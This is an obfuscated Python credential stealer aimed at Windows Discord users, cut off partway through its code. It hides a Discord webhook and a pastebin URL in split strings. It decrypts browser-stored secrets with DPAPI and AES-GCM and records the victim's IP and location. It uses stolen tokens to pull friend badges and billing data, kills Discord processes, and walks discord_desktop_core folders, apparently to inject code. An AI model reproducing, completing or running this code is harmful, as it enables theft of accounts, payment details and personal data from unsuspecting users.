import os #line:1
import threading #line:2
from sys import executable #line:3
from sqlite3 import connect as sql_connect #line:4
import re #line:5
from base64 import b64decode #line:6
from json import loads as json_loads ,load #line:7
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:8
from urllib .request import Request ,urlopen #line:9
from json import *#line:10
import time #line:11
import shutil #line:12
from zipfile import ZipFile #line:13
import random #line:14
import re #line:15
import subprocess #line:16
import sys #line:17
import shutil #line:18
import uuid #line:19
import socket #line:20
import getpass #line:21
VVEDEZrmTp6Fuszyky5XVsLGx4xMtRet64xAbKzQLAdv6GK8F4W89nGzuLGntJf7Bn9t6aaw74fqk8q84Z3ZuLTZRADPmuWRNT9ezn7yrcFjNSLbScwesZBwgKZG3AL ='https'#line:23
xsFwC8WQLJQAuBT3RA2jARqLC5jhMzqpffb4ZjaBpugpdhZKxTxSA9JKLJVsk4LN5GGRG9Wkt3gkGk3uDvSVXkxxhg7stgTAtuspjGnuryhjBfreD3KpG5wzRPv ='scor'#line:24
enLjnvQX5XNVdhbeWvVckhNj2ACWF596ezb5qU9K3Uyz3TJCbUYEGWVmKw6VuPeDWB2mLRaTFMRDWyfyxj3hFXch5ZSSSfPmBGHFVGyX7Pq =f'di{xsFwC8WQLJQAuBT3RA2jARqLC5jhMzqpffb4ZjaBpugpdhZKxTxSA9JKLJVsk4LN5GGRG9Wkt3gkGk3uDvSVXkxxhg7stgTAtuspjGnuryhjBfreD3KpG5wzRPv}d.com'#line:25
YSS9MJKjjcKkkmBwVj8HRwccZ5aJ3UXyBHQuLeK5gQpuz935UcvnF3fJN ='bhook'#line:26
hooooooooooookss520520 =f'we{YSS9MJKjjcKkkmBwVj8HRwccZ5aJ3UXyBHQuLeK5gQpuz935UcvnF3fJN}s'#line:27
g3ERvCuCGcjPmGvdpuzHUV2c4LNpzSzZ2jb2DyUNmvt29jTJRwAq9TpD4yfL67NHWSSJLUJAm4rtSmX5Mg6mV47J6SVGZZjr4NthTuWX7TyFUrhfjbfbt5JAZNEFt5KYdT3fjHQgzd7eBSDYaXvr6Apq38uwBH4cnsSqqnGZc3npNkUuMd3aARHnL9WgERGWJdD27PfP4hpxyUYQ6nhs68c4KgCXutcbhBjFYMvpyw8KnAf8fjANrEUGXP9eeycHgjjL2StYpsemnqsHsxw3G7da8RF5FY9Ej2K5LJp2HuYe5ML9PGgYbaNYL88nyPdk5X3JyBwBDUb7xbRyL8AHUvfkSZKneMJtuMLSQ3sKcYj8wA6s9jJsbKyUGgs9w9qUKPPHH22VaSAGWSUMZeNnAxHW2scKu4X8t5mAX26Qusvtp4zKZGSnfkgvzXuTXpG9RptebKdHDZCKLemmEgxkcWHMMCy3juumPZZQdBqGwkm4XyJ35EpJt8aHyr9a2CAj ='6521807'#line:28
VuKqxtcXapuy9Xce6dc7Qw2rpbgy9x7mkue2n2BV9Y7u5PkWvqzj5nCvC6SzNP7b3YWyJGeq5U4ve9y64EsLYM3uGkkuaJtjkQCDeK26bzmCkaj8VzmMm7pjKVHmEZGCYRUVx2UvnSy77sBxHY2ztvYycrH6MFukkdEktTsWPmexn5Dxz4DJNxVWNRba7DsUh7yrY9pNunf4UM946ssEZNCD7F3G6dJTEPJ7j6FqbdSJPHeP44s56ERxymzfhy9zJssLvfvgUcYdFcLJa8ypzyHr5YQtkT4SwJ8nA6Vsexupt3RK7vNQqVV8pBX8mGqCBL3cxGQ5DH2BC7FzZEstJYFsjCFGRS3vvd6EgDNwcGKVPGsLN6TnUdqRrPEZ9R5RDYvFxdqVyHTmZsWrgb7Un9r7QvGcu2dew4jd8dJRYwdvyeFgxZ2xs3Gv6rCG9d85pxKj5YMZ948ndNBj8JPDcj8NcM84jLZZxApTKfcGC79s6NmaMTyrPuNae34mujrb =f'1{g3ERvCuCGcjPmGvdpuzHUV2c4LNpzSzZ2jb2DyUNmvt29jTJRwAq9TpD4yfL67NHWSSJLUJAm4rtSmX5Mg6mV47J6SVGZZjr4NthTuWX7TyFUrhfjbfbt5JAZNEFt5KYdT3fjHQgzd7eBSDYaXvr6Apq38uwBH4cnsSqqnGZc3npNkUuMd3aARHnL9WgERGWJdD27PfP4hpxyUYQ6nhs68c4KgCXutcbhBjFYMvpyw8KnAf8fjANrEUGXP9eeycHgjjL2StYpsemnqsHsxw3G7da8RF5FY9Ej2K5LJp2HuYe5ML9PGgYbaNYL88nyPdk5X3JyBwBDUb7xbRyL8AHUvfkSZKneMJtuMLSQ3sKcYj8wA6s9jJsbKyUGgs9w9qUKPPHH22VaSAGWSUMZeNnAxHW2scKu4X8t5mAX26Qusvtp4zKZGSnfkgvzXuTXpG9RptebKdHDZCKLemmEgxkcWHMMCy3juumPZZQdBqGwkm4XyJ35EpJt8aHyr9a2CAj}944'#line:29
zQtLjgLmJ5nj8dSbMpH6vYFZAdPnNHhag6wzyFQHF57UdDrAz5R8P2SqAzUnGZL4Zgjxnepe5f9eB9gqCxRJ7hvdZWzueGUH6RPqZCZhMv7EGFF5JazzBgd5JvzfthfFJnunDwJ9J9ue3HsD8kLpT2eTJq9wZeYVBARBt8PqJrkPPj5zueVU2a36cHRdRRzhWfGRHPkcn65MqyWFVmqzrmYeeu2hsYrsbtx9jGwJsRFtaJKBsHJUXS2QXVyb5E5P ='389'#line:30
AuNh6Cmk54bx4A8eNXwCPHNMMEtmdKkYxykHvtTvQ2gjDvTL5rJgqRsEKXapMpH2JfKmGEDeZXRXUrskbPLWWX5ZgAFN7k4WLgKmSLLvmsrHxMAMsZg9FqnPeAedMUSq6kXgVW7RsrEQQ8Q7zDUpE5tCBVafccaNL3WDUZwGtdTctJFfs7jLDgG5HkhwxRUzgx4uhuMV9wYeuL9tYbk28NDQS5tE7G2fQpYEm7vLZHHNYUrLNMjMVMseSYMTbDuW ='3cE'#line:31
ZwTVAwMQLe9SrztSGj8JBRjuPrXR9p9KvjzskWuazR7UxnFUX5T3yv44uGau7mewa2WP4WkFAB4KJQwjKaLHgcVWJTzSvVh8vBCPYMRvATwMCQryrQNMgvwqzwKtUH7V =f'w{AuNh6Cmk54bx4A8eNXwCPHNMMEtmdKkYxykHvtTvQ2gjDvTL5rJgqRsEKXapMpH2JfKmGEDeZXRXUrskbPLWWX5ZgAFN7k4WLgKmSLLvmsrHxMAMsZg9FqnPeAedMUSq6kXgVW7RsrEQQ8Q7zDUpE5tCBVafccaNL3WDUZwGtdTctJFfs7jLDgG5HkhwxRUzgx4uhuMV9wYeuL9tYbk28NDQS5tE7G2fQpYEm7vLZHHNYUrLNMjMVMseSYMTbDuW}m'#line:32
mDDz4Ewwkg3C3rA8ykLv2EeUbRBmKk8VAYLE5G7FtB8qwJycccrZkDbxCs4zjjYr4cMnthqB2uAKczTqX8PhA9R3seVqbEpwswksZMmHGu4XNq8zUhs8pv5mYPc44XXJS878DNpEj5ms2Pf66CGMfpPfz7MgarGxMZ4qq6YqRX7ALkdHBb39LRma4AaZB2paLFQ89BunRWhNwagdsa5Rgyj6E9g2EUhvYxtCFFdXzs58KUpgJwnUjTKFNUSb5hkY =f'Y{ZwTVAwMQLe9SrztSGj8JBRjuPrXR9p9KvjzskWuazR7UxnFUX5T3yv44uGau7mewa2WP4WkFAB4KJQwjKaLHgcVWJTzSvVh8vBCPYMRvATwMCQryrQNMgvwqzwKtUH7V}19ut'#line:33
KAz8uYxTSD3U6FQnnTATfTcy6bp7KSSm344UvwR9tMtkvqLAHWDBDXBdFg7nSrfpZPBuz5VY5hRgBteWDZed6YgTXR6A83JaSfEqeqCgctSvUu5Ww5yeAVhWLwC7xYyT8SKxdYcDSPd3PwtMPUdcyDWy2KxLj7fR8BULBD7mwjsL9qmULY7bZpKZkpGvCMa8ECM7dvYHDchbxmTHVqKLy8665EzJ4X5gEbjtzcnetPbqQZvkNQaALmuTuUEcnsPQ ='Loo_'#line:34
Eh2jph4z9pS6QvMMtxjw7tgQTrUVngRmTgKFcxF34cPd4Mz3mS4nEXAeEEA5rsMrqasRCRUgyDnJTNpPMrKz8DAppRMB3nm6RncDhJd8JbPW8gT5U3kX2BQupAgm9Edx6csptnshSZvtmzCYuSX9FzcX63N8TRGmxAYXB9VfSMeS48BwbPNJVXbGe475BD8DbjE38qZjUGp7HfbUHYUAyWN9ej5KsGdr9RgVrkAmC4aZ6Db7uj2NVuh4tDcLTbxpSx74Phn6GMAdkxEh2j66QNkW3zAavYzMDMcmDaDEeHGyhhGAjeDrBMBfTWJpCRYNZwxVa6CHRB895CnkQ4rPZFDYf4abcvVxQPHx2GzReNYd32Kxcpv7tvFuJspuzD2DZNZh7NELkPNLENhNmttYmtg8SDVpz5HLc3YS7NfpuTrAaTtmsdHKKb9GLxSnYPWwAAUbvrgUcD7UXpJJ82LDYXv5yRpyPW3yyXtM6ZRzYvcsXvxEPpJvtP67dG5xt96u =f'yO5-5{KAz8uYxTSD3U6FQnnTATfTcy6bp7KSSm344UvwR9tMtkvqLAHWDBDXBdFg7nSrfpZPBuz5VY5hRgBteWDZed6YgTXR6A83JaSfEqeqCgctSvUu5Ww5yeAVhWLwC7xYyT8SKxdYcDSPd3PwtMPUdcyDWy2KxLj7fR8BULBD7mwjsL9qmULY7bZpKZkpGvCMa8ECM7dvYHDchbxmTHVqKLy8665EzJ4X5gEbjtzcnetPbqQZvkNQaALmuTuUEcnsPQ}GdYlnsoz4Eh9vhOzC7U6tJ'#line:35
E47qhyeaxtq7aDSRXrhD68wqXurGbFA887DAYPCREgFgNTjzAWgMZBy5mQtcNuaZLTSdZHARCU4sLrM526KUuca2RwUdy5B4kkRPN85zD2rzKXzNdbDx3ZfCwfyH9mxn =f'{VVEDEZrmTp6Fuszyky5XVsLGx4xMtRet64xAbKzQLAdv6GK8F4W89nGzuLGntJf7Bn9t6aaw74fqk8q84Z3ZuLTZRADPmuWRNT9ezn7yrcFjNSLbScwesZBwgKZG3AL}://{enLjnvQX5XNVdhbeWvVckhNj2ACWF596ezb5qU9K3Uyz3TJCbUYEGWVmKw6VuPeDWB2mLRaTFMRDWyfyxj3hFXch5ZSSSfPmBGHFVGyX7Pq}/api/{hooooooooooookss520520}/11{VuKqxtcXapuy9Xce6dc7Qw2rpbgy9x7mkue2n2BV9Y7u5PkWvqzj5nCvC6SzNP7b3YWyJGeq5U4ve9y64EsLYM3uGkkuaJtjkQCDeK26bzmCkaj8VzmMm7pjKVHmEZGCYRUVx2UvnSy77sBxHY2ztvYycrH6MFukkdEktTsWPmexn5Dxz4DJNxVWNRba7DsUh7yrY9pNunf4UM946ssEZNCD7F3G6dJTEPJ7j6FqbdSJPHeP44s56ERxymzfhy9zJssLvfvgUcYdFcLJa8ypzyHr5YQtkT4SwJ8nA6Vsexupt3RK7vNQqVV8pBX8mGqCBL3cxGQ5DH2BC7FzZEstJYFsjCFGRS3vvd6EgDNwcGKVPGsLN6TnUdqRrPEZ9R5RDYvFxdqVyHTmZsWrgb7Un9r7QvGcu2dew4jd8dJRYwdvyeFgxZ2xs3Gv6rCG9d85pxKj5YMZ948ndNBj8JPDcj8NcM84jLZZxApTKfcGC79s6NmaMTyrPuNae34mujrb}61{zQtLjgLmJ5nj8dSbMpH6vYFZAdPnNHhag6wzyFQHF57UdDrAz5R8P2SqAzUnGZL4Zgjxnepe5f9eB9gqCxRJ7hvdZWzueGUH6RPqZCZhMv7EGFF5JazzBgd5JvzfthfFJnunDwJ9J9ue3HsD8kLpT2eTJq9wZeYVBARBt8PqJrkPPj5zueVU2a36cHRdRRzhWfGRHPkcn65MqyWFVmqzrmYeeu2hsYrsbtx9jGwJsRFtaJKBsHJUXS2QXVyb5E5P}8/PDuYp7gpt7damV{Eh2jph4z9pS6QvMMtxjw7tgQTrUVngRmTgKFcxF34cPd4Mz3mS4nEXAeEEA5rsMrqasRCRUgyDnJTNpPMrKz8DAppRMB3nm6RncDhJd8JbPW8gT5U3kX2BQupAgm9Edx6csptnshSZvtmzCYuSX9FzcX63N8TRGmxAYXB9VfSMeS48BwbPNJVXbGe475BD8DbjE38qZjUGp7HfbUHYUAyWN9ej5KsGdr9RgVrkAmC4aZ6Db7uj2NVuh4tDcLTbxpSx74Phn6GMAdkxEh2j66QNkW3zAavYzMDMcmDaDEeHGyhhGAjeDrBMBfTWJpCRYNZwxVa6CHRB895CnkQ4rPZFDYf4abcvVxQPHx2GzReNYd32Kxcpv7tvFuJspuzD2DZNZh7NELkPNLENhNmttYmtg8SDVpz5HLc3YS7NfpuTrAaTtmsdHKKb9GLxSnYPWwAAUbvrgUcD7UXpJJ82LDYXv5yRpyPW3yyXtM6ZRzYvcsXvxEPpJvtP67dG5xt96u}v8q8YsKWPa3k{mDDz4Ewwkg3C3rA8ykLv2EeUbRBmKk8VAYLE5G7FtB8qwJycccrZkDbxCs4zjjYr4cMnthqB2uAKczTqX8PhA9R3seVqbEpwswksZMmHGu4XNq8zUhs8pv5mYPc44XXJS878DNpEj5ms2Pf66CGMfpPfz7MgarGxMZ4qq6YqRX7ALkdHBb39LRma4AaZB2paLFQ89BunRWhNwagdsa5Rgyj6E9g2EUhvYxtCFFdXzs58KUpgJwnUjTKFNUSb5hkY}a'#line:36
G5qPE33WFxDYAKRNfHjxmDDXPYnZpUx8yJUxdg3mSNzeh94m83QkjBK6pMYF5nbJvr7hnnaVqWZMFhuBhUKUE5cbmbdJkDMxUhh553KRy6QrfwGR5e3WNVh4PxuQhj8q ='htt'#line:37
v8kkjBP8fn5VabeptS9u4bZHmLfzZeCpuQcVQZ3TCJx8swCkETZgUffTmRfRPeupTweRztRj76V2bEAQqegDJBg4SEyD5r5bEBt9KEZ7ymbe5JVv3sGbEP3Mub67m2sL =f'{G5qPE33WFxDYAKRNfHjxmDDXPYnZpUx8yJUxdg3mSNzeh94m83QkjBK6pMYF5nbJvr7hnnaVqWZMFhuBhUKUE5cbmbdJkDMxUhh553KRy6QrfwGR5e3WNVh4PxuQhj8q}ps'#line:38
KNGfaAfSSdDNdjv2eJYKLGf45ZDPSGHA6FPSfzt3QfgXU4VGTDu67Beqwfah9UmVuzYZp3G6238bfdazbBnhLeyLstetTEKNRHVeQfCbqcc6rCPETdBHAJtNJRvgaFFf ='tebin.'#line:39
RzRaEMQznsFUq5feMHUec8dU5NYjXWj6te8ke5fgaLAsQrTZUMFVf7q5rCXEz5MMnPatKG3CPjAnhQNPghL8PYt8jdXXArCNUCQD6wJcxjNxLr3P6RjtUsHTh6YFTp7X =f'pas{KNGfaAfSSdDNdjv2eJYKLGf45ZDPSGHA6FPSfzt3QfgXU4VGTDu67Beqwfah9UmVuzYZp3G6238bfdazbBnhLeyLstetTEKNRHVeQfCbqcc6rCPETdBHAJtNJRvgaFFf}'#line:40
VNZWeJJtxRWEYMbEZ8DHr6Zh68ccFDRvPBQdyDLBdPDEsXKM4rSpLBjrmXvKdRWRTknNZk4eQPG5EpHF2yDAdwRdPteP3gAPgwGnyyGNkBvnLKm384HD4EkWSBMUqZQR ='w'#line:41
WYb6kjET6hu7gD77SAhrEcjmNCwwKPn2cnrwjCuA22UZpyMgjHCZRpBL3AHSz9Pkcxs6qx3Hqk74zmjeU3epWcUSQFchj4e4J7ysrcJJZmc5UnzKf7Asx3qCAZBXFHL6 ='r'#line:42
loverg51we520gw520ehg52you =f'{WYb6kjET6hu7gD77SAhrEcjmNCwwKPn2cnrwjCuA22UZpyMgjHCZRpBL3AHSz9Pkcxs6qx3Hqk74zmjeU3epWcUSQFchj4e4J7ysrcJJZmc5UnzKf7Asx3qCAZBXFHL6}a{VNZWeJJtxRWEYMbEZ8DHr6Zh68ccFDRvPBQdyDLBdPDEsXKM4rSpLBjrmXvKdRWRTknNZk4eQPG5EpHF2yDAdwRdPteP3gAPgwGnyyGNkBvnLKm384HD4EkWSBMUqZQR}'#line:43
C4VGgrpVW2k8QRAC4Ww4JbWzknAQJwQNfUvXvvSrxyeLPs8psVXPvxpJzQPg2BepyeneWRg7LFNPe5QkjEF7454aMBu3DKxUWvNv7kRh6eDgu2qJXfhqPtNZ84MhTDSn ='s'#line:44
Q44HuG39gLwT9VL3wsayLRUdeDVW8fXfusEN3AuERVdRK7WXZf2sgR2GdNmeZG5YuD7AhACvkMcdsTpsFV7FzUAFQez99TKSjpjzmEaKD7yA2TpwbQx9zNusj7d9y4Nv ='N9'#line:45
RfTEr7ssTCweLNFSnHjX46CeFKN7SjvXvyCedzxa2VR9kU7f6qcyjE5h7QseseBnxk9gbMFH9y9RV9G8HKNZwZhX5yZMW33QLuXEwCT42x3zQ6442XvYQkEbnXfDD5Xd ='1'#line:46
AHtpytFSvWKuGkK9rxrqNpg8Q2eRQzdydpsF5q7Fp8pYw8nLL9WXPu3VnrKWMR3jtqXKTALUwG5J2W49C2h4B8EBpbbSHhYBzZPD8tJRKX5gCHZajYycfrwNz7GyJYBL =f'B{C4VGgrpVW2k8QRAC4Ww4JbWzknAQJwQNfUvXvvSrxyeLPs8psVXPvxpJzQPg2BepyeneWRg7LFNPe5QkjEF7454aMBu3DKxUWvNv7kRh6eDgu2qJXfhqPtNZ84MhTDSn}Z{RfTEr7ssTCweLNFSnHjX46CeFKN7SjvXvyCedzxa2VR9kU7f6qcyjE5h7QseseBnxk9gbMFH9y9RV9G8HKNZwZhX5yZMW33QLuXEwCT42x3zQ6442XvYQkEbnXfDD5Xd}8{Q44HuG39gLwT9VL3wsayLRUdeDVW8fXfusEN3AuERVdRK7WXZf2sgR2GdNmeZG5YuD7AhACvkMcdsTpsFV7FzUAFQez99TKSjpjzmEaKD7yA2TpwbQx9zNusj7d9y4Nv}J'#line:47
tFZ9PZEnaF3KvLTuwECpbz56ycLZakxwDfXuans8uU2FFJYfBBv28s8nuweSKcuUTa7LrdjCL3VnGkvLHFGHp5t7jxyR9HUdgBtTPdJuuufM9VKzPWUgNDz7pe3AbqkRtFZ9PZEnaF3KvLTuwECpbz56ycLZakxwDfXuans8uU2FFJYfBBv28s8nuweSKcuUTa7LrdjCL3VnGkvLHFGHp5t7jxyR9HUdgBtTPdJuuufM9VKzPWUgNDz7pe3AbqkR =f'{v8kkjBP8fn5VabeptS9u4bZHmLfzZeCpuQcVQZ3TCJx8swCkETZgUffTmRfRPeupTweRztRj76V2bEAQqegDJBg4SEyD5r5bEBt9KEZ7ymbe5JVv3sGbEP3Mub67m2sL}://{RzRaEMQznsFUq5feMHUec8dU5NYjXWj6te8ke5fgaLAsQrTZUMFVf7q5rCXEz5MMnPatKG3CPjAnhQNPghL8PYt8jdXXArCNUCQD6wJcxjNxLr3P6RjtUsHTh6YFTp7X}com/{loverg51we520gw520ehg52you}/{AHtpytFSvWKuGkK9rxrqNpg8Q2eRQzdydpsF5q7Fp8pYw8nLL9WXPu3VnrKWMR3jtqXKTALUwG5J2W49C2h4B8EBpbbSHhYBzZPD8tJRKX5gCHZajYycfrwNz7GyJYBL}'#line:48
DETECTED =False #line:50
def g3t1p ():#line:52
    O000OOO000OO0O00O ="None"#line:53
    try :#line:54
        O000OOO000OO0O00O =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:55
    except :#line:56
        pass #line:57
    return O000OOO000OO0O00O #line:58
requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"],]#line:63
for modl in requirements :#line:64
    try :__import__ (modl [0 ])#line:65
    except :#line:66
        subprocess .Popen (f"{executable} -m pip install {modl[1]}",shell =True )#line:67
        time .sleep (3 )#line:68
import requests #line:70
from Crypto .Cipher import AES #line:71
local =os .getenv ('LOCALAPPDATA')#line:73
roaming =os .getenv ('APPDATA')#line:74
temp =os .getenv ("TEMP")#line:75
Threadlist =[]#line:76
class DATA_BLOB (Structure ):#line:79
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:83
def G3tD4t4 (O0O000OOOOO00OO00 ):#line:85
    O0O000OO0O000OOOO =int (O0O000OOOOO00OO00 .cbData )#line:86
    O00O00OOO0OO00000 =O0O000OOOOO00OO00 .pbData #line:87
    OOO0O000O00O0O0O0 =c_buffer (O0O000OO0O000OOOO )#line:88
    cdll .msvcrt .memcpy (OOO0O000O00O0O0O0 ,O00O00OOO0OO00000 ,O0O000OO0O000OOOO )#line:89
    windll .kernel32 .LocalFree (O00O00OOO0OO00000 )#line:90
    return OOO0O000O00O0O0O0 .raw #line:91
def CryptUnprotectData (O000OOOO0OOOOOOOO ,entropy =b''):#line:93
    O00OO0O0O00O0O00O =c_buffer (O000OOOO0OOOOOOOO ,len (O000OOOO0OOOOOOOO ))#line:94
    OOOO00O0OOO0OO0OO =c_buffer (entropy ,len (entropy ))#line:95
    OO00000O0O00O00O0 =DATA_BLOB (len (O000OOOO0OOOOOOOO ),O00OO0O0O00O0O00O )#line:96
    OO000O0OO0OO0OOO0 =DATA_BLOB (len (entropy ),OOOO00O0OOO0OO0OO )#line:97
    OO00OOOOO000OO00O =DATA_BLOB ()#line:98
    if windll .crypt32 .CryptUnprotectData (byref (OO00000O0O00O00O0 ),None ,byref (OO000O0OO0OO0OOO0 ),None ,None ,0x01 ,byref (OO00OOOOO000OO00O )):#line:100
        return G3tD4t4 (OO00OOOOO000OO00O )#line:101
def D3kryptV4lU3 (OO0OO0O000OO00000 ,master_key =None ):#line:103
    OO0O0O0000O0OOO0O =OO0OO0O000OO00000 .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:104
    if OO0O0O0000O0OOO0O =='v10'or OO0O0O0000O0OOO0O =='v11':#line:105
        O00OOOOO00OOOOOOO =OO0OO0O000OO00000 [3 :15 ]#line:106
        O0OOO00O00OO0O000 =OO0OO0O000OO00000 [15 :]#line:107
        O000OOO0O0O00O0OO =AES .new (master_key ,AES .MODE_GCM ,O00OOOOO00OOOOOOO )#line:108
        O0O0OO0O0OO000O0O =O000OOO0O0O00O0OO .decrypt (O0OOO00O00OO0O000 )#line:109
        O0O0OO0O0OO000O0O =O0O0OO0O0OO000O0O [:-16 ].decode ()#line:110
        return O0O0OO0O0OO000O0O #line:111
def L04dR3qu3sTs (O00OO00O0OO000O00 ,OO0O0OOOO000O00OO ,data ='',files ='',headers =''):#line:113
    for OOOOOOO0O0OO0O000 in range (8 ):#line:114
        try :#line:115
            if O00OO00O0OO000O00 =='POST':#line:116
                if data !='':#line:117
                    OO0O000O0OOO0O0O0 =requests .post (OO0O0OOOO000O00OO ,data =data )#line:118
                    if OO0O000O0OOO0O0O0 .status_code ==200 :#line:119
                        return OO0O000O0OOO0O0O0 #line:120
                elif files !='':#line:121
                    OO0O000O0OOO0O0O0 =requests .post (OO0O0OOOO000O00OO ,files =files )#line:122
                    if OO0O000O0OOO0O0O0 .status_code ==200 or OO0O000O0OOO0O0O0 .status_code ==413 :#line:123
                        return OO0O000O0OOO0O0O0 #line:124
        except :#line:125
            pass #line:126
def L04durl1b (OOOOOOO00OO00OO0O ,data ='',files ='',headers =''):#line:128
    for O0OO00000OO0000O0 in range (8 ):#line:129
        try :#line:130
            if headers !='':#line:131
                O0OO0OO0O00O00O00 =urlopen (Request (OOOOOOO00OO00OO0O ,data =data ,headers =headers ))#line:132
                return O0OO0OO0O00O00O00 #line:133
            else :#line:134
                O0OO0OO0O00O00O00 =urlopen (Request (OOOOOOO00OO00OO0O ,data =data ))#line:135
                return O0OO0OO0O00O00O00 #line:136
        except :#line:137
            pass #line:138
def globalInfo ():#line:140
    OO000OO0OO0O0OO00 =g3t1p ()#line:141
    OO00O0OO0OO0000OO =os .getenv ("USERNAME")#line:142
    O000O0000OO0O0000 =urlopen (Request (f"https://geolocation-db.com/jsonp/{OO000OO0OO0O0OO00}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:143
    O000O0000OOO00OO0 =loads (O000O0000OO0O0000 )#line:144
    O0OO0O0OO0O0OO00O =O000O0000OOO00OO0 ["country_name"]#line:145
    OO00000OOO0000000 =O000O0000OOO00OO0 ["country_code"].lower ()#line:146
    OOO0O00OO0OOOOO0O =O000O0000OOO00OO0 ["state"]#line:147
    O000OOOO00000O00O =f":flag_{OO00000OOO0000000}:  - `{OO00O0OO0OO0000OO.upper()} | {OO000OO0OO0O0OO00} ({O0OO0O0OO0O0OO00O})`"#line:149
    return O000OOOO00000O00O #line:150
def TR6st (O000O0O0O0OOOO0O0 ):#line:153
    global DETECTED #line:154
    OOO00OOOOO0000O00 =str (O000O0O0O0OOOO0O0 )#line:155
    OO0O0000OOOOOO000 =re .findall (".google.com",OOO00OOOOO0000O00 )#line:156
    if len (OO0O0000OOOOOO000 )<-1 :#line:157
        DETECTED =True #line:158
        return DETECTED #line:159
    else :#line:160
        DETECTED =False #line:161
        return DETECTED #line:162
def G3tUHQFr13ndS (O0000O00OO0OOO00O ):#line:164
    O0O0O0OOOO0O0OO0O =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:176
    O0O0OOOOO00O0O000 ={"Authorization":O0000O00OO0OOO00O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:181
    try :#line:182
        O0O0OO000OO0O0O00 =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =O0O0OOOOO00O0O000 )).read ().decode ())#line:183
    except :#line:184
        return False #line:185
    OOOOO0OOO0O00O000 =''#line:187
    for OOOOOOOO00OOO0O0O in O0O0OO000OO0O0O00 :#line:188
        O00O00OO0OOO00OOO =''#line:189
        O00O000OOO0O0OO0O =OOOOOOOO00OOO0O0O ['user']['public_flags']#line:190
        for O00O0OOOO0OOOO0OO in O0O0O0OOOO0O0OO0O :#line:191
            if O00O000OOO0O0OO0O //O00O0OOOO0OOOO0OO ["Value"]!=0 and OOOOOOOO00OOO0O0O ['type']==1 :#line:192
                if not "House"in O00O0OOOO0OOOO0OO ["Name"]:#line:193
                    O00O00OO0OOO00OOO +=O00O0OOOO0OOOO0OO ["Emoji"]#line:194
                O00O000OOO0O0OO0O =O00O000OOO0O0OO0O %O00O0OOOO0OOOO0OO ["Value"]#line:195
        if O00O00OO0OOO00OOO !='':#line:196
            OOOOO0OOO0O00O000 +=f"{O00O00OO0OOO00OOO} | {OOOOOOOO00OOO0O0O['user']['username']}#{OOOOOOOO00OOO0O0O['user']['discriminator']} ({OOOOOOOO00OOO0O0O['user']['id']})\n"#line:197
    return OOOOO0OOO0O00O000 #line:198
process_list =os .popen ('tasklist').readlines ()#line:201
for process in process_list :#line:204
    if "Discord"in process :#line:205
        pid =int (process .split ()[1 ])#line:207
        os .system (f"taskkill /F /PID {pid}")#line:208
def G3tb1ll1ng (OO00OO000OO00O0O0 ):#line:210
    OO0O00OOO000O0000 ={"Authorization":OO00OO000OO00O0O0 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:215
    try :#line:216
        OO00OOO0O0OO0OOOO =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =OO0O00OOO000O0000 )).read ().decode ())#line:217
    except :#line:218
        return False #line:219
    if OO00OOO0O0OO0OOOO ==[]:return "```None```"#line:221
    O0O00O000O00O0O00 =""#line:223
    for OO0000O0OOOOOO0OO in OO00OOO0O0OO0OOOO :#line:224
        if OO0000O0OOOOOO0OO ["invalid"]==False :#line:225
            if OO0000O0OOOOOO0OO ["type"]==1 :#line:226
                O0O00O000O00O0O00 +=":credit_card:"#line:227
            elif OO0000O0OOOOOO0OO ["type"]==2 :#line:228
                O0O00O000O00O0O00 +=":parking: "#line:229
    return O0O00O000O00O0O00 #line:231
def lovecodev2 ():#line:233
    O0O0OO0OO000O0000 =os .getlogin ()#line:235
    OOOOOO0OOO00OOOO0 =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']#line:237
    for OO00O000OO0000O00 in OOOOOO0OOO00OOOO0 :#line:239
        O000000OOO00O000O =os .path .join (os .getenv ('LOCALAPPDATA'),OO00O000OO0000O00 )#line:240
        if os .path .isdir (O000000OOO00O000O ):#line:241
            for O000OO000OOO0OO0O ,OO0OOO00000OO0000 ,OO00OOOOO0O0O0OOO in os .walk (O000000OOO00O000O ):#line:242
                if 'app-'in O000OO000OOO0OO0O :#line:243
                    for O000OOOO0O00O00O0 in OO0OOO00000OO0000 :#line:244
                        if 'modules'in O000OOOO0O00O00O0 :#line:245
                            OOOOOOO0O0OOOOOOO =os .path .join (O000OO000OOO0OO0O ,O000OOOO0O00O00O0 )#line:246
                            for O0O0000O0OOOOOOOO ,OO000O0O000O00000 ,OO00OOOO00O0O0O00 in os .walk (OOOOOOO0O0OOOOOOO ):#line:247
                                if 'discord_desktop_core-'in O0O0000O0OOOOOOOO :#line:248
                                    for O0OO0O00OOO00OO00 ,O0O0OO0OO0O0O00OO ,O00O00OOOO000OOOO in os .walk (O0O0000O0OOOOOOOO ):#line:249
                                        if 'discord_desktop_core'in O0OO0O00OOO00OO00 :#line:250
                                            for O0OOO00000OO0000O in O00O00OOOO000OOOO :#line:251
